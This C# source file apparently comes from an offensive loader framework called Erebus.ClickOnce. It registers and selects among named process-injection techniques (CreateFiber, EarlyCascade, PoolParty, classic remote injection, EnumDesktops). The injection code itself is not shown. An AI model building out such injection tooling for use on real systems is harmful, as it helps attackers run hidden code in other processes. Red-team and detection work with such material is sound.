using Erebus.ClickOnce.Injections;
using System;
using System.Collections.Generic;
using System.Runtime.Versioning;

namespace Erebus.ClickOnce
{
    [SupportedOSPlatform("windows")]
    public static class InjectionFactory
    {
        private static readonly Dictionary<string, Func<IInjectionMethod>> _injectionMethods = new()
        {
            { "createfiber", () => new CreateFiberInjection() },
            { "earlycascade", () => new EarlyCascadeInjection() },
            { "poolparty", () => new PoolPartyInjection() },
            { "classic", () => new ClassicRemoteInjection() },
            { "enumdesktops", () => new EnumDesktopsInjection() }
        };

        public static IInjectionMethod GetInjectionMethod(string methodName)
        {
            var key = methodName.ToLower().Replace(" ", "").Replace("-", "");
            
            if (_injectionMethods.TryGetValue(key, out var factory))
            {
                return factory();
            }

            throw new ArgumentException($"Unknown injection method: {methodName}");
        }

        public static void ListAvailableMethods()
        {
            DebugLogger.WriteLine("\n[*] Available Injection Methods:");
            DebugLogger.WriteLine("================================");
            
            foreach (var kvp in _injectionMethods)
            {
                var method = kvp.Value();
                DebugLogger.WriteLine($"\n  [{kvp.Key}]");
                DebugLogger.WriteLine($"  Name: {method.Name}");
                DebugLogger.WriteLine($"  Description: {method.Description}");
            }
            
            DebugLogger.WriteLine("\n================================\n");
        }

        public static bool IsValidMethod(string methodName)
        {
            var key = methodName.ToLower().Replace(" ", "").Replace("-", "");
            return _injectionMethods.ContainsKey(key);
        }

        public static IEnumerable<string> GetAvailableMethodNames()
        {
            foreach (var kvp in _injectionMethods)
            {
                yield return kvp.Value().Name;
            }
        }
    }
}
